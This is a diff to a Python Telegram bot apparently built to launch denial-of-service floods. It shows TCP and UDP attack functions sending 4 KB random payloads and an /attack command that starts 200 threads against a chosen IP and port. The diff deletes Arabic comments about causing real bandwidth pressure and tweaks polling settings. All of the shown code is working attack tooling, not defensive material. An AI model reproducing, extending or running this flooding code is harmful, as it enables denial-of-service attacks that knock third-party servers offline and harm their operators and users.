@@ -106,7 +106,6 @@ def tcp_attack(ip, port, duration):
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(1)
             s.connect((ip, port))
-            # إرسال بيانات ضخمة وحقيقية للضغط الفعلي
             s.send(os.urandom(4096))
             s.close()
             stats["sent"] += 1
@@ -116,7 +115,6 @@ def tcp_attack(ip, port, duration):
 def udp_attack(ip, port, duration):
     end = time.time() + duration
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    # حزمة بيانات ضخمة حقيقية (حوالي 4 كيلوبايت لكل حزمة لإحداث تأثير حقيقي على النطاق الترددي)
     payload = os.urandom(4096)
     while time.time() < end and not stop_event.is_set():
         try:
@@ -191,7 +189,6 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ وضع الهجوم غير صحيح! اختر (tcp, udp, http).")
         return
 
-    # زيادة عدد الخيوط (Threads) إلى 200 لضمان قوة التدفق والضغط الحقيقي
     threads = []
     for _ in range(200):
         t = threading.Thread(target=attack_func)
@@ -255,4 +252,4 @@ if __name__ == "__main__":
         app.add_handler(CommandHandler("start", start_command))
         app.add_handler(CommandHandler("attack", attack_command))
         print("Telegram Bot is running successfully...")
-        app.run_polling()
+        app.run_polling(allowed_updates=Update.ALL_TYPES)
